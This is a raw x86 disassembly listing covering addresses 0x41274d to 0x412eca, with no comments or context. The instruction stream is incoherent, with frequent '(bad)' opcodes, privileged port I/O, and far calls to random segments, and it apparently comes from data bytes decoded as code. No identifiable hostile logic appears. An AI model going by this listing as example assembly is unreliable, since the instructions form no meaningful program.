  41274d:	push   ss
  41274e:	inc    esi
  41274f:	push   ebp
  412750:	and    eax,0x1790b45d
  412755:	enter  0x8dde,0x6e
  412759:	jne    0x41278c
  41275b:	jnp    0x412779
  41275d:	pop    eax
  41275e:	cli    
  41275f:	push   ss
  412760:	in     eax,0x2a
  412762:	rol    BYTE PTR [edx-0xf],cl
  412765:	shl    DWORD PTR [ecx],cl
  412767:	push   esp
  412768:	clc    
  412769:	push   cs
  41276a:	fnsetpm(287 only) 
  41276c:	imul   eax,DWORD PTR [eax],0xffffff85
  41276f:	lods   al,BYTE PTR ds:[esi]
  412770:	cmp    BYTE PTR [esi-0x4eb19f5c],0x8d
  412777:	sub    al,0x78
  412779:	rol    BYTE PTR ds:0x45ba888b,cl
  41277f:	icebp  
  412780:	push   es
  412781:	mov    WORD PTR [ebx-0x40],?
  412784:	in     eax,dx
  412785:	pop    esi
  412786:	nop
  412787:	loope  0x41278f
  412789:	xor    edx,DWORD PTR [ebx+edi*2]
  41278c:	es push ds
  41278e:	jae    0x4127ef
  412790:	clc    
  412791:	xor    ecx,DWORD PTR [ecx-0x37]
  412794:	xchg   esi,eax
  412795:	rcr    DWORD PTR [eax+esi*4],1
  412798:	dec    esp
  412799:	or     BYTE PTR [ebx+eiz*8+0x26217e0c],al
  4127a0:	pop    ecx
  4127a1:	push   edi
  4127a2:	imul   ebp,ebx,0x7f
  4127a5:	pushf  
  4127a6:	pop    esi
  4127a7:	jns    0x4127d7
  4127a9:	out    dx,eax
  4127aa:	loope  0x412772
  4127ac:	sbb    BYTE PTR [edi+0x544ebcea],0x36
  4127b3:	call   0x9515:0x99bcad56
  4127ba:	cmp    eax,0x6c40a50
  4127bf:	je     0x41276b
  4127c1:	mov    al,ds:0x8435a609
  4127c6:	popf   
  4127c7:	jo     0x41278b
  4127c9:	cli    
  4127ca:	and    DWORD PTR ds:0xa38e58ed,edi
  4127d0:	enter  0x69e9,0x18
  4127d4:	gs xchg edi,esi
  4127d7:	outs   dx,DWORD PTR ds:[esi]
  4127d8:	dec    ecx
  4127d9:	bts    DWORD PTR [eax],eax
  4127dc:	xor    al,0x29
  4127de:	fistp  QWORD PTR [edx+0x545c684e]
  4127e4:	mov    bl,0xc0
  4127e6:	shl    DWORD PTR [esi+eax*2-0x6f],cl
  4127ea:	jmp    FWORD PTR [ebx-0x66]
  4127ed:	and    bl,BYTE PTR [edi]
  4127ef:	push   ecx
  4127f0:	sub    BYTE PTR [ebx+ebx*4+0x2cfe4742],dl
  4127f7:	push   es
  4127f8:	retf   
  4127f9:	(bad)  
  4127fa:	outs   dx,DWORD PTR ds:[esi]
  4127fb:	inc    edx
  4127fc:	(bad)  
  4127fd:	stos   BYTE PTR es:[edi],al
  4127fe:	jae    0x4127f1
  412800:	das    
  412801:	sub    DWORD PTR [ecx-0x6e062dee],ebp
  412807:	add    BYTE PTR ds:0x1a55c7e8,dh
  41280d:	add    DWORD PTR [eax+0x14496830],0xffffff87
  412814:	pop    ecx
  412815:	push   0x75
  412817:	repnz dec esp
  412819:	sub    dl,BYTE PTR [eax]
  41281b:	shl    BYTE PTR [edi+0x2d],1
  41281e:	ret    0x6254
  412821:	xchg   ebp,eax
  412822:	das    
  412823:	aaa    
  412824:	mov    bl,0xcc
  412826:	cdq    
  412827:	pop    esi
  412828:	lea    edi,ss:[edi+ecx*2]
  41282c:	dec    esi
  41282d:	inc    ecx
  41282e:	push   ecx
  41282f:	mov    BYTE PTR [edx-0x3d],dl
  412832:	push   esi
  412833:	sbb    al,0x9e
  412835:	aam    0xd1
  412837:	ror    DWORD PTR [edx-0x65345c00],1
  41283d:	enter  0x7f3f,0x1
  412841:	sbb    al,dh
  412843:	add    DWORD PTR [eax],0x32
  412846:	das    
  412847:	mov    cl,0x82
  412849:	(bad)  
  41284a:	scas   eax,DWORD PTR es:[edi]
  41284b:	imul   edx,esi,0xfffffffb
  41284e:	and    al,bl
  412850:	ret    
  412851:	xor    esp,DWORD PTR [ecx+0x44cbdd0c]
  412857:	xor    BYTE PTR ds:0x8370ab05,dl
  41285d:	push   0xa9134bb1
  412862:	fwait
  412863:	pcmpgtb mm2,mm5
  412866:	ret    
  412867:	sbb    BYTE PTR [ebp+0x42],0x55
  41286b:	ins    BYTE PTR es:[edi],dx
  41286c:	mov    ebp,0x69bb0745
  412871:	pop    ecx
  412872:	push   0x71274ef6
  412877:	ins    BYTE PTR es:[edi],dx
  412878:	(bad)  
  412879:	cli    
  41287a:	jae    0x4128c9
  41287c:	push   ebp
  41287d:	popfw  
  41287f:	xchg   edi,eax
  412880:	mov    edi,DWORD PTR [edx]
  412882:	lods   eax,DWORD PTR ds:[esi]
  412883:	pop    ecx
  412884:	jl     0x41280d
  412886:	push   ecx
  412887:	pop    ss
  412888:	mov    edi,0x3805eec7
  41288d:	fwait
  41288e:	cld    
  41288f:	fwait
  412890:	cmc    
  412891:	inc    ebx
  412892:	mov    esi,0x9a1b711a
  412897:	fwait
  412898:	cmp    cl,BYTE PTR [eax]
  41289a:	push   es
  41289b:	scas   al,BYTE PTR es:[edi]
  41289c:	add    BYTE PTR [esi+0x4d],cl
  41289f:	fsub   QWORD PTR [esi]
  4128a1:	pushf  
  4128a2:	mov    al,ds:0x22988781
  4128a7:	sub    ecx,DWORD PTR [ebx-0x6f56a954]
  4128ad:	mov    dh,0x56
  4128af:	lods   al,BYTE PTR ds:[esi]
  4128b0:	rcr    dl,0xed
  4128b3:	sub    eax,0xb80acaad
  4128b8:	ss retf 0xa84
  4128bc:	scas   al,BYTE PTR es:[edi]
  4128bd:	jecxz  0x41293e
  4128bf:	test   eax,0x1ea47322
  4128c4:	xor    edi,DWORD PTR [esi+0x72974fe9]
  4128ca:	jge    0x4128e4
  4128cc:	mov    BYTE PTR [ecx-0x68a759d2],bh
  4128d2:	lods   al,BYTE PTR ds:[esi]
  4128d3:	(bad)  
  4128d5:	js     0x412914
  4128d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128d8:	pop    esp
  4128d9:	sti    
  4128da:	(bad)  
  4128db:	fnstsw WORD PTR [eax-0x51]
  4128de:	loope  0x412875
  4128e0:	mov    al,ds:0x48c280a9
  4128e5:	lock (bad) 
  4128e8:	retf   
  4128e9:	rcl    BYTE PTR [edx-0x6cfe05db],cl
  4128ef:	push   eax
  4128f0:	push   0x7137e49
  4128f5:	pop    esi
  4128f6:	mov    edx,DWORD PTR [edx-0x14]
  4128f9:	ror    BYTE PTR [eiz*8-0x7ac583],cl
  412900:	jmp    0x8a0d:0xebfe6332
  412907:	(bad)  
  412909:	test   al,0x76
  41290b:	call   0x6a8a:0xcae57e15
  412912:	mov    eax,0x84b1094
  412917:	mov    ecx,0x344b46a
  41291c:	out    0xfd,al
  41291e:	cli    
  41291f:	cmp    dh,BYTE PTR [ebx-0x20]
  412922:	ret    
  412923:	fild   DWORD PTR [ebx-0x359b9651]
  412929:	mov    al,ds:0x269796c0
  41292e:	xchg   ebx,eax
  41292f:	mov    BYTE PTR [edx-0x6f],dl
  412932:	push   esp
  412933:	jbe    0x4129af
  412935:	(bad)  
  412936:	rol    DWORD PTR [esi-0x63],cl
  412939:	inc    edx
  41293a:	lea    eax,[esp+edi*4]
  41293d:	jle    0x41297f
  41293f:	scas   eax,DWORD PTR es:[edi]
  412940:	das    
  412941:	add    ecx,DWORD PTR [esi+0x2e24f9e2]
  412947:	ficom  WORD PTR [esi]
  412949:	mov    ebp,DWORD PTR fs:[esi-0x73]
  41294d:	int    0xc7
  41294f:	in     al,0x26
  412951:	pop    esp
  412952:	call   0x82e2:0xfc8f34d0
  412959:	and    BYTE PTR [esi],al
  41295b:	jo     0x412916
  41295d:	leave  
  41295e:	mov    bh,0xe8
  412960:	cmp    esi,DWORD PTR [eax]
  412962:	jns    0x412944
  412964:	cs and eax,0xa549939c
  41296a:	(bad)  [edx+0x42]
  41296d:	loopne 0x4129c4
  41296f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412970:	cli    
  412971:	jg     0x41299e
  412973:	out    0xab,eax
  412975:	sub    eax,0x87a68a5f
  41297a:	or     BYTE PTR [edi],ch
  41297c:	or     BYTE PTR [esi+0x19],dh
  41297f:	loope  0x4129ae
  412981:	arpl   WORD PTR [ebx+0x11],bx
  412984:	add    ecx,DWORD PTR [ebx+0x2a369cdd]
  41298a:	sar    BYTE PTR [eax+0x60],1
  41298d:	shl    DWORD PTR [edx],cl
  41298f:	mov    ch,0xd6
  412991:	mov    eax,ds:0x992ee2f
  412996:	push   ebp
  412997:	add    BYTE PTR [eax-0x455c834f],al
  41299d:	mov    ecx,0xcbb56b8
  4129a2:	sbb    BYTE PTR [ebx-0x40],cl
  4129a5:	xor    al,0x32
  4129a7:	cdq    
  4129a8:	mov    bh,0xad
  4129aa:	xchg   ebp,eax
  4129ab:	icebp  
  4129ac:	mov    esp,DWORD PTR [ecx+0x2e9c94c5]
  4129b2:	adc    DWORD PTR ds:0x7b485ee2,edi
  4129b8:	dec    esi
  4129b9:	popa   
  4129ba:	or     BYTE PTR [ecx+ebp*8+0x7c],cl
  4129be:	outs   dx,DWORD PTR ds:[esi]
  4129bf:	xchg   DWORD PTR [edx],edx
  4129c1:	fs pushf 
  4129c3:	lods   eax,DWORD PTR ds:[esi]
  4129c4:	cmp    al,0xe6
  4129c6:	xchg   ebx,eax
  4129c7:	aas    
  4129c8:	out    dx,eax
  4129c9:	test   al,0xcc
  4129cb:	inc    ebx
  4129cc:	loop   0x412a24
  4129ce:	inc    edx
  4129cf:	iret   
  4129d0:	mov    esi,0x2b3ef5a4
  4129d5:	jle    0x412a3e
  4129d7:	mov    es,ecx
  4129d9:	outs   dx,DWORD PTR ds:[esi]
  4129da:	xchg   esi,eax
  4129db:	inc    ebx
  4129dc:	aas    
  4129dd:	repnz stc 
  4129df:	pop    esi
  4129e0:	cdq    
  4129e1:	js     0x4129c3
  4129e3:	or     edi,DWORD PTR [ebx+0x28]
  4129e6:	sub    edi,DWORD PTR [ecx]
  4129e8:	add    eax,0x73b425cd
  4129ed:	pop    esi
  4129ee:	loop   0x4129e9
  4129f0:	jne    0x4129b0
  4129f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129f3:	ror    DWORD PTR [eax+0x4f],1
  4129f6:	and    edi,DWORD PTR [eax+0x31]
  4129f9:	cdq    
  4129fa:	stos   BYTE PTR es:[edi],al
  4129fb:	fild   WORD PTR [edx+0x2c]
  4129fe:	inc    esi
  4129ff:	and    BYTE PTR [esp+edi*4],0xb9
  412a03:	xchg   esp,eax
  412a04:	out    0xd3,al
  412a06:	jae    0x4129b3
  412a08:	adc    BYTE PTR [edx+eax*4+0x57e364a9],bh
  412a0f:	inc    edx
  412a10:	fimul  DWORD PTR [ecx]
  412a12:	sti    
  412a13:	sub    cl,BYTE PTR [ebp+0x715f5ca7]
  412a19:	mov    DWORD PTR [edi-0x49],esp
  412a1c:	xchg   ebp,eax
  412a1d:	ins    BYTE PTR es:[edi],dx
  412a1e:	push   ebx
  412a1f:	shl    BYTE PTR [esi],1
  412a21:	mov    dh,0xc1
  412a23:	mov    dl,0x49
  412a25:	stc    
  412a26:	or     edi,DWORD PTR [ebx]
  412a28:	xchg   ecx,eax
  412a29:	loopne 0x412a49
  412a2b:	into   
  412a2c:	and    al,cl
  412a2e:	cwde   
  412a2f:	xchg   edx,eax
  412a30:	(bad)  
  412a31:	stc    
  412a32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a33:	push   edi
  412a34:	outs   dx,BYTE PTR ds:[esi]
  412a35:	lahf   
  412a36:	cli    
  412a37:	mov    ?,ebp
  412a39:	add    eax,0x74e84cff
  412a3e:	sub    edi,esi
  412a40:	in     al,0xa3
  412a42:	out    0x98,eax
  412a44:	das    
  412a45:	arpl   dx,ax
  412a47:	outs   dx,BYTE PTR ds:[esi]
  412a48:	dec    ebp
  412a49:	cmp    ah,cl
  412a4b:	je     0x412a18
  412a4d:	sar    BYTE PTR [esi],1
  412a4f:	dec    eax
  412a50:	mov    ecx,es
  412a52:	jns    0x412a1f
  412a54:	xor    edi,ebx
  412a56:	and    eax,0xda953de8
  412a5b:	lea    eax,[edi]
  412a5d:	cmp    eax,0xa63c36f
  412a62:	lea    eax,[edx]
  412a64:	sub    BYTE PTR [ecx+0x56b26c84],bh
  412a6a:	push   eax
  412a6b:	imul   edx,edi,0x3d
  412a6e:	lea    ecx,[ebp+0x2a4875ad]
  412a74:	inc    edi
  412a75:	add    al,0x90
  412a77:	jecxz  0x412af0
  412a79:	clc    
  412a7a:	mov    DWORD PTR [ebp+0x36457d85],edi
  412a80:	jecxz  0x412a31
  412a82:	xchg   edx,eax
  412a83:	outs   dx,DWORD PTR ds:[esi]
  412a84:	div    DWORD PTR [edi+0x59]
  412a87:	xchg   esp,eax
  412a88:	ins    BYTE PTR es:[edi],dx
  412a89:	mov    dl,0xda
  412a8b:	(bad)  
  412a8c:	and    eax,0x17185a13
  412a91:	repnz pop ebp
  412a93:	loope  0x412aa6
  412a95:	test   DWORD PTR [ecx+0xd7cacfc],ebx
  412a9b:	sbb    bl,BYTE PTR [edx]
  412a9d:	lods   eax,DWORD PTR ds:[esi]
  412a9e:	scas   al,BYTE PTR es:[edi]
  412a9f:	retf   
  412aa0:	std    
  412aa1:	nop
  412aa2:	fs xchg esp,eax
  412aa4:	or     eax,0xddf084bc
  412aa9:	pop    edi
  412aaa:	sbb    eax,0xc9474edf
  412aaf:	cmc    
  412ab0:	xor    cl,BYTE PTR [ecx+0x506ca08]
  412ab6:	hlt    
  412ab7:	out    0x5d,eax
  412ab9:	sub    bh,BYTE PTR [ecx-0x71]
  412abc:	sub    DWORD PTR [ecx-0x74f95db],ebx
  412ac2:	jmp    0x4e8a257d
  412ac7:	mov    bl,0xd4
  412ac9:	jo     0x412b32
  412acb:	inc    esi
  412acc:	push   ebx
  412acd:	mov    esi,0xea24280
  412ad2:	fdiv   st,st(7)
  412ad4:	retf   0xd9fa
  412ad7:	and    eax,0xa205e80f
  412adc:	out    0x5e,eax
  412ade:	mov    edx,0x8db845b
  412ae3:	push   edx
  412ae4:	mov    ecx,0xbe32b048
  412ae9:	call   0xb3ca:0xbbab044a
  412af0:	mov    esp,0x8cc911a
  412af5:	(bad)  
  412af7:	scas   al,BYTE PTR es:[edi]
  412af8:	mov    ds:0x41516acb,al
  412afd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412afe:	nop
  412aff:	lods   al,BYTE PTR ds:[esi]
  412b00:	outs   dx,BYTE PTR ds:[esi]
  412b01:	int    0x44
  412b03:	cmc    
  412b04:	ins    BYTE PTR es:[edi],dx
  412b05:	inc    ebp
  412b06:	ret    0x4e7
  412b09:	cmp    BYTE PTR [eax],ch
  412b0b:	(bad)  
  412b0c:	adc    eax,0x66c1c072
  412b11:	test   al,0x3f
  412b13:	or     BYTE PTR [ebx+0x6f29d213],cl
  412b19:	test   al,0xd0
  412b1b:	dec    eax
  412b1c:	lahf   
  412b1d:	pop    ecx
  412b1e:	inc    esi
  412b1f:	mov    ebx,0x44fa1ce5
  412b24:	outs   dx,BYTE PTR ds:[esi]
  412b25:	pop    eax
  412b26:	and    eax,0x272ed8a
  412b2b:	push   eax
  412b2c:	xor    bl,BYTE PTR [ebp+0x2234ff61]
  412b32:	les    esp,FWORD PTR cs:[edi]
  412b35:	add    al,0x76
  412b37:	mov    DWORD PTR [ecx-0x6fe4aba0],esi
  412b3d:	ret    
  412b3e:	jge    0x412aca
  412b40:	xchg   edx,eax
  412b41:	enter  0x2f7a,0x3c
  412b45:	sar    BYTE PTR [eax],cl
  412b47:	and    eax,0x9782c183
  412b4c:	std    
  412b4d:	dec    ebx
  412b4e:	es pop es
  412b50:	mov    ch,BYTE PTR [ecx]
  412b52:	xlat   BYTE PTR ds:[ebx]
  412b53:	ins    BYTE PTR es:[edi],dx
  412b54:	cmp    eax,0x79b8ee7c
  412b59:	test   BYTE PTR [esi-0x6a03dd9],al
  412b5f:	xor    eax,0xafb7e83a
  412b64:	(bad)  
  412b66:	sub    al,0x8f
  412b68:	loop   0x412b99
  412b6a:	mov    ebp,0x8c5d660a
  412b6f:	stos   DWORD PTR es:[edi],eax
  412b70:	loope  0x412b16
  412b72:	fstp   DWORD PTR [ebx+0x37579200]
  412b78:	sbb    ch,BYTE PTR [edx]
  412b7a:	mov    bh,0xbc
  412b7c:	mov    al,bl
  412b7e:	jmp    0x98e5:0x27945f83
  412b85:	inc    ebp
  412b86:	cmp    ebp,DWORD PTR [edx+0x2d465aae]
  412b8c:	jns    0x412c02
  412b8e:	ss pushf 
  412b90:	xchg   edi,eax
  412b91:	adc    eax,0x6715b39
  412b96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b97:	cs cmp al,0x2a
  412b9a:	pop    ebp
  412b9b:	in     eax,0x78
  412b9d:	js     0x412b42
  412b9f:	and    dl,0x1c
  412ba2:	xor    BYTE PTR [ebx+eiz*1+0x3e],bl
  412ba6:	push   ds
  412ba7:	outs   dx,DWORD PTR ds:[esi]
  412ba8:	cmp    BYTE PTR [ecx+0x1bc37804],ch
  412bae:	ja     0x412bc3
  412bb0:	inc    ecx
  412bb1:	mov    ebx,0xaebbaa0d
  412bb6:	pushf  
  412bb7:	cmp    BYTE PTR [ecx+0x2f],bh
  412bba:	xchg   edi,eax
  412bbb:	push   ds
  412bbc:	xchg   DWORD PTR [ecx],ebp
  412bbe:	cmp    edi,ebx
  412bc0:	(bad)  
  412bc2:	rcr    DWORD PTR [ebp+0x1],0x63
  412bc6:	xchg   esp,eax
  412bc7:	dec    ecx
  412bc8:	dec    ebx
  412bc9:	popa   
  412bca:	int    0x2a
  412bcc:	add    ch,ah
  412bce:	pusha  
  412bcf:	nop
  412bd0:	inc    edx
  412bd1:	repz adc BYTE PTR [edi+0x3bbbc4d4],0x89
  412bd9:	repz mov bl,0xd5
  412bdc:	(bad)  
  412bdd:	jnp    0x412b65
  412bdf:	add    eax,0x8303df2c
  412be4:	add    edi,esp
  412be6:	leave  
  412be7:	and    cl,ah
  412be9:	dec    esi
  412bea:	jl     0x412bdb
  412bec:	jmp    0x412baa
  412bee:	adc    BYTE PTR [ecx],dh
  412bf0:	dec    esi
  412bf1:	(bad)  
  412bf3:	imul   ebp,DWORD PTR [ecx-0x6f66141a],0xffffffd7
  412bfa:	scas   eax,DWORD PTR es:[edi]
  412bfb:	cmp    dl,dl
  412bfd:	pop    eax
  412bfe:	cld    
  412bff:	jmp    0x412c1f
  412c01:	mov    cl,0xdb
  412c03:	int3   
  412c04:	xor    BYTE PTR [esi+ecx*4-0x50],0x86
  412c09:	icebp  
  412c0a:	add    BYTE PTR [esi-0x4f280c9e],dl
  412c10:	mov    DWORD PTR [ebx+0x7],ebp
  412c13:	das    
  412c14:	inc    ebx
  412c15:	pop    ds
  412c16:	icebp  
  412c17:	cli    
  412c18:	xor    BYTE PTR [eax+0x4ae72f2c],bh
  412c1e:	cs dec ebx
  412c20:	ret    0x183c
  412c23:	or     al,0xef
  412c25:	inc    esi
  412c26:	cmp    eax,0x46821b23
  412c2b:	sbb    al,0x9f
  412c2d:	and    ecx,esi
  412c2f:	int3   
  412c30:	retf   0x13ff
  412c33:	add    ebp,esp
  412c35:	in     al,dx
  412c36:	cmp    DWORD PTR [eax],ebx
  412c38:	imul   ebx,DWORD PTR [ebp-0x3b],0x3f
  412c3c:	test   al,0x8f
  412c3e:	mov    cl,0xb9
  412c40:	lods   al,BYTE PTR ds:[esi]
  412c41:	mov    ch,0x18
  412c43:	sti    
  412c44:	ds mov bl,0x7f
  412c47:	push   ds
  412c48:	dec    ecx
  412c49:	fwait
  412c4a:	push   ecx
  412c4b:	jecxz  0x412c7f
  412c4d:	(bad)  
  412c4e:	ja     0x412c3b
  412c50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c51:	mov    ebx,0x4d1cc9a1
  412c56:	test   BYTE PTR [ebx+ebp*8+0x1d],cl
  412c5a:	xchg   esi,eax
  412c5b:	ss add eax,0x111686db
  412c61:	scas   al,BYTE PTR es:[edi]
  412c62:	add    BYTE PTR [ebx],0xf2
  412c65:	pop    edi
  412c66:	nop
  412c67:	mov    DWORD PTR [esi+0x65],edx
  412c6a:	pop    ebp
  412c6b:	inc    esp
  412c6c:	shl    DWORD PTR [edx],1
  412c6e:	in     eax,0xb9
  412c70:	fistp  DWORD PTR [edi]
  412c72:	sahf   
  412c73:	adc    BYTE PTR [eax+0x2819f4a7],dh
  412c79:	xchg   ebp,eax
  412c7a:	inc    edi
  412c7b:	push   eax
  412c7c:	popa   
  412c7d:	(bad)  
  412c7e:	inc    BYTE PTR [edi+0x6ecd15cc]
  412c84:	das    
  412c85:	adc    al,0x74
  412c87:	jo     0x412c26
  412c89:	int    0xb6
  412c8b:	mov    esp,0x8f4232fa
  412c90:	mov    edx,0xf16f78ff
  412c95:	sub    BYTE PTR ds:0x20c369ec,0x80
  412c9c:	lods   eax,DWORD PTR ds:[si]
  412c9e:	fdivr  QWORD PTR [edi-0x5af90525]
  412ca4:	cmp    DWORD PTR [esi+0x21068f3],esi
  412caa:	cmp    eax,0x42f1d0ec
  412caf:	adc    esi,DWORD PTR [ebx]
  412cb1:	ret    0x46f
  412cb4:	mov    edx,0x1049c71c
  412cb9:	fnstenv [ecx]
  412cbb:	xchg   edi,eax
  412cbc:	in     eax,dx
  412cbd:	ret    
  412cbe:	and    al,0x4f
  412cc0:	inc    ebp
  412cc1:	xchg   esi,eax
  412cc2:	add    ch,BYTE PTR [edi]
  412cc4:	push   edi
  412cc5:	mov    dl,dh
  412cc7:	loope  0x412c51
  412cc9:	jae    0x412d18
  412ccb:	repnz retf 
  412ccd:	pop    ss
  412cce:	and    al,0x50
  412cd0:	fs push 0x8379f217
  412cd6:	out    dx,eax
  412cd7:	add    cl,BYTE PTR [eax-0x3b]
  412cda:	xor    DWORD PTR [edx+0x12],0xcb5694d5
  412ce1:	popa   
  412ce2:	pop    edx
  412ce3:	pop    ecx
  412ce4:	aam    0xe1
  412ce6:	xor    cl,dh
  412ce8:	lds    esp,FWORD PTR [esi+esi*2-0xe15bc91]
  412cef:	sahf   
  412cf0:	sub    eax,0xb93f3dd4
  412cf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cf6:	add    eax,0x253a65c5
  412cfb:	enter  0x4a5a,0x96
  412cff:	aam    0xf1
  412d01:	cmp    dh,bh
  412d03:	add    edi,ebp
  412d05:	scas   al,BYTE PTR es:[edi]
  412d06:	cmp    DWORD PTR [ebx+0x34e7cc8a],0xfd0ef3bc
  412d10:	(bad)  [esi]
  412d12:	push   es
  412d13:	test   ch,0x3c
  412d16:	ret    
  412d17:	sbb    ch,BYTE PTR [edi]
  412d19:	jge    0x412d3b
  412d1b:	push   edi
  412d1c:	cmc    
  412d1d:	retf   0x188d
  412d20:	and    BYTE PTR [ecx+0x107ffc1],cl
  412d26:	ins    BYTE PTR es:[edi],dx
  412d27:	pop    esp
  412d28:	pop    ebp
  412d29:	mov    bh,0x97
  412d2b:	xchg   esp,eax
  412d2c:	push   edi
  412d2d:	dec    edi
  412d2e:	jo     0x412d6f
  412d30:	lds    edx,FWORD PTR [edx]
  412d32:	mov    BYTE PTR [ebx+0x63],dl
  412d35:	pop    eax
  412d36:	mov    DWORD PTR [edi],ebx
  412d38:	bound  ebp,QWORD PTR [edi-0x66]
  412d3b:	(bad)  
  412d3c:	in     al,0xe5
  412d3e:	in     eax,0xdc
  412d40:	mov    ch,0x38
  412d42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d43:	mov    ch,0xda
  412d45:	cdq    
  412d46:	cmp    esp,DWORD PTR [ebp+0x2]
  412d49:	jae    0x412dba
  412d4b:	cmp    eax,0x9a6a6c9e
  412d50:	mov    bh,0x3b
  412d52:	aas    
  412d53:	(bad)  
  412d54:	mov    eax,ds:0x8873f5b2
  412d59:	jns    0x412d56
  412d5b:	xchg   edx,eax
  412d5c:	xor    al,0xa1
  412d5e:	push   edi
  412d5f:	and    edx,DWORD PTR [esi+0x8]
  412d62:	shld   DWORD PTR [esp+ebx*8-0xc],eax,0x60
  412d68:	nop
  412d69:	xor    BYTE PTR [eax-0x31],0x30
  412d6d:	mov    eax,ebp
  412d6f:	pop    edi
  412d70:	(bad)  
  412d71:	jns    0x412d56
  412d73:	aam    0xbb
  412d75:	mov    edi,0x43d257f3
  412d7a:	push   es
  412d7b:	js     0x412ddd
  412d7d:	test   al,0x9a
  412d7f:	push   ebx
  412d80:	outs   dx,DWORD PTR ds:[esi]
  412d81:	in     al,dx
  412d82:	mov    esi,0x11f15f8
  412d87:	or     BYTE PTR [edx+0xd],bh
  412d8a:	retf   0x25eb
  412d8d:	push   ebx
  412d8e:	and    eax,0xa8ad72b1
  412d93:	(bad)  
  412d94:	inc    eax
  412d95:	sbb    DWORD PTR [eax],esi
  412d97:	rcl    DWORD PTR [ecx-0x5],cl
  412d9a:	dec    edi
  412d9b:	js     0x412dc8
  412d9d:	daa    
  412d9e:	add    ah,dh
  412da0:	test   al,0xc4
  412da2:	loopne 0x412dba
  412da4:	sbb    BYTE PTR [ebx+0x5acd1579],0x82
  412dab:	icebp  
  412dac:	inc    edi
  412dad:	std    
  412dae:	out    0xa5,eax
  412db0:	sub    BYTE PTR [ebp+0x42],ah
  412db3:	and    ebx,DWORD PTR ds:0x5ac5a91f
  412db9:	(bad)  
  412dba:	sti    
  412dbb:	test   DWORD PTR [eax-0x79ec544a],0x65013040
  412dc5:	push   ss
  412dc6:	int    0xf3
  412dc8:	and    ebp,ebx
  412dca:	dec    esi
  412dcb:	push   ebx
  412dcc:	mov    bh,0xc4
  412dce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412dcf:	and    BYTE PTR [ecx+0x11],dh
  412dd2:	mov    ebx,DWORD PTR [ecx-0x3e5b8bdd]
  412dd8:	fs clc 
  412dda:	or     BYTE PTR [edx-0x5d],0xa0
  412dde:	dec    ebx
  412ddf:	or     eax,0x357b10c1
  412de4:	mov    BYTE PTR [ebp-0x3b],0x32
  412de8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412de9:	inc    eax
  412dea:	jbe    0x412da5
  412dec:	ss cdq 
  412dee:	and    edx,esp
  412df0:	adc    eax,0xee0ba103
  412df5:	and    eax,0x2fc90181
  412dfa:	adc    ch,BYTE PTR [edx-0xe]
  412dfd:	mov    dh,0xe6
  412dff:	adc    eax,0xfe8f4366
  412e04:	push   edx
  412e05:	jne    0x412e53
  412e07:	and    dh,BYTE PTR ds:0xa1cf511
  412e0d:	mov    bh,0x5b
  412e0f:	push   ebx
  412e10:	es ins BYTE PTR es:[edi],dx
  412e12:	ror    edi,1
  412e14:	fs das 
  412e16:	loope  0x412e46
  412e18:	das    
  412e19:	dec    ebx
  412e1a:	retf   
  412e1b:	fs dec ebp
  412e1d:	or     al,BYTE PTR ss:[esi+edi*8-0x6]
  412e22:	mov    cl,0xc2
  412e24:	jnp    0x412e96
  412e26:	das    
  412e27:	(bad)  
  412e28:	into   
  412e29:	ror    bl,0x15
  412e2c:	addr16 (bad) 
  412e2e:	(bad)  [eax+0xd]
  412e31:	jle    0x412e4a
  412e33:	imul   edi,DWORD PTR [eax+ebp*1],0xffffffb0
  412e37:	mov    WORD PTR [ecx+0x6d],?
  412e3a:	enter  0xc52,0xb6
  412e3e:	xchg   edx,eax
  412e3f:	xchg   edx,eax
  412e40:	pop    ss
  412e41:	xor    cl,BYTE PTR [edi+eiz*2+0x54]
  412e45:	je     0x412e90
  412e47:	xchg   ecx,eax
  412e48:	pop    edi
  412e49:	jnp    0x412e9c
  412e4b:	push   eax
  412e4c:	ret    0x5ef3
  412e4f:	jo     0x412e3b
  412e51:	sub    ebp,edi
  412e53:	stos   DWORD PTR es:[edi],eax
  412e54:	jo     0x412ebb
  412e56:	imul   ebx,DWORD PTR [edi+0x7bd6553c],0xfffffffc
  412e5d:	aad    0x99
  412e5f:	test   DWORD PTR [edx+0xa74e3c5],edi
  412e65:	xlat   BYTE PTR cs:[ebx]
  412e67:	xlat   BYTE PTR ds:[ebx]
  412e68:	(bad)  
  412e6a:	repz shl DWORD PTR [ecx-0x7f],0x44
  412e6f:	cdq    
  412e70:	mov    dl,0x2c
  412e72:	cmp    eax,0xd12a8a1
  412e77:	in     eax,0x8a
  412e79:	xchg   DWORD PTR [esi+esi*8],eax
  412e7c:	sub    dh,BYTE PTR [edi+eax*1]
  412e7f:	jne    0x412eb4
  412e81:	jecxz  0x412ec1
  412e83:	add    DWORD PTR [esi-0x68],esp
  412e86:	xchg   DWORD PTR [esi],ecx
  412e88:	adc    BYTE PTR [edi],dl
  412e8a:	sbb    DWORD PTR [ecx],0x45
  412e8d:	inc    ecx
  412e8e:	call   0xd7c72171
  412e93:	test   DWORD PTR [ecx-0x7d],eax
  412e96:	or     BYTE PTR [edx+0x63],dl
  412e99:	inc    ecx
  412e9a:	imul   esp,DWORD PTR [edi-0x57],0xbfc758b6
  412ea1:	add    eax,0x867e85ff
  412ea6:	(bad)  
  412ea7:	xchg   edx,eax
  412ea8:	xchg   ebx,eax
  412ea9:	add    ch,BYTE PTR [esi+0x19]
  412eac:	out    dx,al
  412ead:	inc    ecx
  412eae:	sub    cl,BYTE PTR [ebx+0x18]
  412eb1:	inc    ebx
  412eb2:	fst    QWORD PTR [esi+0x30fedf84]
  412eb8:	mov    edi,0x3cd5a39d
  412ebd:	in     eax,0xfd
  412ebf:	mov    eax,DWORD PTR [edx+0x52]
  412ec2:	cld    
  412ec3:	and    BYTE PTR [ebx+0x70d7bd7c],al
  412ec9:	pop    edi
  412eca:	inc    ebp
